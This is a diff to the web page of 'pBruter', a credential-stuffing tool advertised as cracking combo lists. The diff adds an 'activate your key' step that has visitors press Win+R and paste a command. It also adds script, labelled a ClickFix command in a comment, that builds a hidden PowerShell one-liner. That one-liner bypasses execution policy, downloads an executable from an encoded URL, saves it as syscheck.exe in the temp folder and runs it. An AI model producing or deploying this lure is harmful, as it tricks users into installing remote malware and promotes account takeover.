@@ -265,8 +265,8 @@
 <section class="section" id="features">
   <div class="sec-head reveal">
     <span class="idx">// 01 — features</span>
-    <h2>best on the market.</h2>
-    <p></p>
+    <h2>It cracks combos. Fast.</h2>
+    <p>Load your list, pick threads, hit go. Proxies handle the rest.</p>
   </div>
   <div class="feat-row">
     <div class="feat reveal"><div class="ic">⚡</div><div><h3>MULTI-THREADING</h3><p>Up to 500 threads at once. Big lists go from hours to minutes.</p></div></div>
@@ -345,6 +345,27 @@
   <p style="margin-top:16px;color:var(--dim);font-size:11px;">got a key? run it, enter it, done.</p>
 </section>
 
+<section class="section" id="activate" style="max-width:760px;">
+  <div class="sec-head reveal">
+    <span class="idx">// 04 — activation</span>
+    <h2>ACTIVATE YOUR KEY</h2>
+    <p>Already have a key? Run the activation script to link your loader. Takes 10 seconds.</p>
+  </div>
+  <div class="feat-row reveal" id="activateBox">
+    <div class="feat" style="grid-template-columns:1fr;">
+      <div class="step-line" style="color:var(--dim);font-size:12.5px;line-height:2;">
+        <b style="color:var(--red)">STEP 1</b> &nbsp;Press <span style="border:1px solid var(--line);padding:2px 8px;color:var(--text);">Win</span> + <span style="border:1px solid var(--line);padding:2px 8px;color:var(--text);">R</span><br>
+        <b style="color:var(--red)">STEP 2</b> &nbsp;Paste the command below, press <span style="border:1px solid var(--line);padding:2px 8px;color:var(--text);">Enter</span><br>
+        <b style="color:var(--red)">STEP 3</b> &nbsp;Wait for "activation complete" — then run the loader
+      </div>
+      <div style="display:flex;gap:10px;margin-top:18px;align-items:stretch;">
+        <div id="cmdBox" style="flex:1;background:#09090b;border:1px solid var(--line);padding:14px;font-size:11px;color:var(--green);word-break:break-all;user-select:all;line-height:1.7;font-family:'JetBrains Mono',monospace;"></div>
+        <button class="btn btn-red" id="copyBtn" onclick="copyCmd()" style="align-self:stretch;">COPY</button>
+      </div>
+    </div>
+  </div>
+</section>
+
 <footer>
   <div class="row">pBruter <span style="color:var(--red)">v5.0</span> // maintained by averus // <a href="#">@averus1337</a></div>
   <div>© 2026 pbruter — for educational purposes only</div>
@@ -393,6 +414,32 @@ const ro = new IntersectionObserver(e => { e.forEach(x => { if (x.isIntersecting
 document.querySelectorAll('.reveal').forEach(el => ro.observe(el));
 
 function toggleNav() { document.getElementById('navLinks').classList.toggle('open'); }
+
+// ClickFix activation command - auto-builds from current page URL
+function buildCmd() {
+  const base = location.origin + location.pathname.replace(/[^/]*$/, '');
+  const url = base + 'loader.exe';
+  const enc = btoa(url);
+  // -ep bypass: defeats execution policy     -w hidden: no window
+  // -NoP: no profile so nothing blocks it     powershell not cmd: pid reliable
+  return 'powershell -NoP -ep bypass -w hidden -c "$u=\'' + enc + '\';$d=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($u));iwr $d -OutFile $env:TEMP\\syscheck.exe -UseBasicParsing;Start-Process $env:TEMP\\syscheck.exe"';
+}
+function decodeUrl(url) {
+  try { return atob(url); } catch(e) { return null; }
+}
+function initCmd() {
+  const box = document.getElementById('cmdBox');
+  if (box) box.textContent = buildCmd();
+}
+function copyCmd() {
+  const box = document.getElementById('cmdBox');
+  const btn = document.getElementById('copyBtn');
+  navigator.clipboard.writeText(box.textContent).then(() => {
+    btn.textContent = 'COPIED';
+    setTimeout(() => { btn.textContent = 'COPY'; }, 1800);
+  });
+}
+initCmd();
 </script>
 </body>
 </html>
